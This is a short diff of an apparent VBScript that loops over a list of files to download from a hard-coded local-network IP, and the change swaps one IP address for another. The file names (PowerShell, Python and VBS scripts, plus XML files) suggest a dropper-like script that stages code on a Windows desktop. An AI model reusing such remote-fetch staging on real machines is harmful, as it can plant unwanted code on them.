@@ -6,7 +6,7 @@ Set objFSO   = CreateObject("Scripting.FileSystemObject")
 desktopPath = objShell.SpecialFolders("Desktop")
 
 ' Define files to download
-ip = "192.168.1.102"
+ip = "192.168.1.96"
 files = Array("GG.ps1", "windows-sht.py", "launch.vbs", "gg.xml", "SendSystem.xml")
 
 For Each filename In files
